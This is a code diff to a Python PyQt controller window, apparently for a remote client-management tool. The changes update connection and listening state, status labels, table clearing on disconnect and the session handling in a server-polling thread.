@@ -81,7 +81,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.unlockedSockets = []
 
         # listen status
-        self.acceptthreadState = True
+        self.acceptthreadState = False
 
         # plugins bank
         self.pluginsBank = {}
@@ -234,8 +234,16 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 if ok:
                     auth_status = get(self.connection_socket, 'auth %s %s' % (self.USERNAME, str(text)), session_id)
                     if auth_status == 'LoginSuccess':
+                        self.actionStopListen_for_connections.setDisabled(False)
+                        self.actionStartListen_for_connections.setDisabled(True)
+                        self.acceptthreadState = True
                         self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
                         self.servers_checker_thread.start()
+
+                        # Status Change
+                        self.statusLabel.setText('Online')
+                        self.statusLabel.setStyleSheet('color: cyan;')
+
                         return
                     elif auth_status == 'LoginError':
                         continue
@@ -245,26 +253,42 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             return
 
     def disconnect_from_server(self):
-        print 'Disconnect'
+        # Clear Content
+        self.serversTable.clearContents()
+        self.serversTable.setRowCount(0)
+        self.offlineServersTable.clearContents()
+        self.offlineServersTable.setRowCount(0)
+
+        self.acceptthreadState = False
+
+        del self.connection_socket
+        del self.checker_socket
+
+        self.actionStopListen_for_connections.setDisabled(True)
+        self.actionStartListen_for_connections.setDisabled(False)
+
+        # Change Status
+        self.statusLabel.setText('Offline')
+        self.statusLabel.setStyleSheet('color: red;')
+
+        # Clients count
+        self.onlineStatus.setText('0')
 
     def check_servers(self, session_id):
         self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.checker_socket.connect((self.IPADDRESS, self.PORT))
-        status = get(self.checker_socket, 'initSession', session_id)
-        if status == 'sessionSuccess':
-            pass
-        elif status == 'sessionError':
-            return
         while self.acceptthreadState:
             try:
-                data = get(self.checker_socket, 'getClients', 'getClients')
+                data = get(self.checker_socket, 'getClients', session_id)
                 self.streaming_socks = ast.literal_eval(data)
                 self.emit(SIGNAL('updateTable()'))
                 time.sleep(3)
             except socket.error:
-                continue
+                self.disconnect_from_server()
+                self.acceptthreadState = False
             except SyntaxError:
-                continue
+                self.disconnect_from_server()
+                self.acceptthreadState = False
 
     def get_preview(self):
         client = self.current_client()
@@ -667,10 +691,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def closeEvent(self, event):
         self.acceptthreadState = False
-        try:
-            get(self.connection_socket, 'quitModerator', 'quit')
-        except:
-            pass
         sys.exit(1)
 
 # Run Application
